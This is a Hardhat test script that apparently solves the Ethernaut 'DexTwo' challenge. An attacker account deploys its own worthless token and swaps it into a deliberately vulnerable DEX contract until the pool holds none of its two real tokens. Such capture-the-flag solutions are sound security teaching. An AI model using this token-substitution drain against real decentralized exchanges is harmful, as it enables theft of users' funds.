import { expect } from "chai";
import { ethers } from "hardhat";

describe("DexTwo", async function () {

  it("Should deplete both tokens", async function () {
    const [signer, attacker] = await ethers.getSigners()

    const DexTwo = await ethers.getContractFactory("DexTwo");
    const dexTwo = await DexTwo.deploy();
    await dexTwo.deployed();

    const SwappableToken = await ethers.getContractFactory("SwappableTokenTwo");
    const token1 = await SwappableToken.deploy(dexTwo.address, "TOKEN1", "TK1", 1000);
    await token1.deployed();

    const token2 = await SwappableToken.deploy(dexTwo.address, "TOKEN2", "TK2", 1000);
    await token2.deployed();

    const maliciousToken = await SwappableToken.connect(attacker).deploy(dexTwo.address, "MALTOKEN", "MAL", 1000);
    await maliciousToken.deployed();

    await dexTwo.setTokens(token1.address, token2.address)

    await token1.transfer(dexTwo.address, 100)
    await token2.transfer(dexTwo.address, 100)


    await token1.transfer(attacker.address, 10)
    await token2.transfer(attacker.address, 10)

    await maliciousToken.connect(attacker).transfer(dexTwo.address, 100)

    await maliciousToken.connect(attacker)["approve(address,uint256)"](dexTwo.address, 300)
    await dexTwo.connect(attacker).swap(maliciousToken.address, token1.address, 100)

    await dexTwo.connect(attacker).swap(maliciousToken.address, token2.address, 200)

    expect(await token1.balanceOf(dexTwo.address)).to.be.eq(0)
    expect(await token2.balanceOf(dexTwo.address)).to.be.eq(0)
  });
});

